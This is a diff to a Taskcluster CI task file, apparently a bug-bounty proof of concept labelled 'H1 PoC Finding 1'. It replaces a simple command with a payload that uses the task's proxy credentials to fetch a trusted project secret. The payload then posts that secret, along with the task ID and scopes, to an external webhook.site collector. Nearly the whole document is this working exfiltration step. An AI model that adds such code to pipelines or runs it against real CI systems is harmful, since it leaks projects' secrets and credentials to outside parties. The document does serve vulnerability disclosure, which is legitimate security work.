@@ -24,6 +24,34 @@ tasks:
         command:
          - - /bin/bash
            - -c
-           - curl http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret
+           - >
+              set -e
+              echo "=========================================="
+              echo "PoC payload running with scopes:"
+              echo "$TASK_SCOPES"
+              echo "Task ID: $TASK_ID"
+              echo "=========================================="
+   
+              # Install curl+jq (minimal ubuntu image may not have jq)
+              apt-get update -qq && apt-get install -y -qq curl jq > /dev/null
+   
+              # Fetch the secret. The task's temporary credentials are
+              # injected by worker-runner as env vars. taskcluster-proxy
+              # (if running as a feature) provides a local HTTP proxy that
+              # forwards with the task's creds. We'll use the HTTP proxy.
+              SECRET=$(curl -sf "http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret")
+   
+              echo "Fetched secret payload:"
+              echo "$SECRET"
+   
+              # Exfiltrate to the collector
+              curl -sS -X POST \
+                -H "Content-Type: application/json" \
+                -d "{\"taskId\":\"$TASK_ID\",\"scopes\":\"$TASK_SCOPES\",\"secret\":$SECRET,\"note\":\"H1 PoC Finding 1 — trusted scope on issue_comment\"}" \
+                https://webhook.site/07fcffd3-87d1-412b-b90d-a0d28ccb4eb6
+   
+              echo "=========================================="
+              echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
+              echo "=========================================="
         features:
           taskclusterProxy: true
